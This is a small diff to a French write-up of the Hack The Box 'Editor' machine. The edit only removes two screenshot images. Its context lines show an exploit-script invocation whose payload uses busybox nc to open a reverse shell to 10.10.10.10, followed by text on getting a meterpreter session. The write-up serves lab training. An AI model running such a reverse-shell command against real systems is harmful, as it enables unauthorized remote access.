@@ -60,9 +60,9 @@ Pour ceux qui n'utilisent pas trop meterpreter, c'est un module de metasploit, c
 python3 exploit.py -t 'http://editor.htb:8080' -c 'busybox nc 10.10.10.10 4444 -e /bin/bash'
 ```
 
-<img class="content-image" src="/assets/content/htb/season8-editor/Pasted%20image%2020251107151624.png" alt="Editor Writeup" loading="lazy">
 
-<img class="content-image" src="/assets/content/htb/season8-editor/Pasted%20image%2020251107151644.png" alt="Editor Writeup" loading="lazy">
+
+
 
 Et juste comme ça on obtient notre meterpreter. On récupère un shell que l'on améliore un peu:
 ```
